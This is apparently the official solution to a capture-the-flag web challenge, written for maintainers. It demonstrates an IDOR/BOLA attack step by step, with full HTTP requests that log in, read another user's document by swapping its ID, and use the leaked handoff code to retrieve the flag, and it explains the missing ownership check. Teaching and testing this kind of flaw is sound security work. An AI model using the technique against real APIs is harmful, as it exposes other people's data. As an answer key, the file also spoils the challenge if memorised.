# Official Solution

This file is for maintainers or for reviewing the challenge, not for the player while they are still solving it.

## 1. Login

From the interface, or by sending a request:

```http
POST /api/auth/login
Content-Type: application/json

{"username":"alex.ward","password":"Maple!47"}
```

It will return `200` with a token. Use it in every next request as `Authorization: Bearer <token>`.

## 2. Check the Normal Behavior First

Request Alex's documents:

```http
GET /api/documents
Authorization: Bearer <token>
```

It will return only one document (`DOC-2026-0017`). Get it using `GET /api/documents/DOC-2026-0017` - this is the normal expected behavior.

Then read `GET /api/announcements` - you will find a reference to another document (`DOC-2026-0042`).

This is not a random guess. It is a real clue available inside the application itself.

## 3. Test the Authorization Boundary

Repeat the same request, but only change the ID:

```http
GET /api/documents/DOC-2026-0042
Authorization: Bearer <token>
```

Even though this document does not belong to Alex, the server returns `200` and gives you the full document - Mira's secret document.

It contains a handoff code and a review request number (`OPS-7719`).

This is the evidence of the IDOR/BOLA: the token was accepted because it is valid, but nobody checked that the owner of the token is actually the owner of the document.

## 4. Get the Receipt

Use the two values found in the secret document:

```http
GET /api/review-requests/OPS-7719/receipt
Authorization: Bearer <token>
X-Handoff-Code: <code from the document>
```

It will return `200` with the receipt and a field called `flag` in the expected format `SK-CTF{...}`.

If you send it without the code, or with a wrong code, it will return `403` and there will be no flag.

So the flag does not appear directly from the IDOR - you need to reach the next step.

## Why This Vulnerability Happens

The document route checks that the token is valid and that the document exists, but it does not compare who owns the document with who is requesting it.

So if you only change the ID in a normal and valid request, you can cross the authorization boundary without the server noticing.
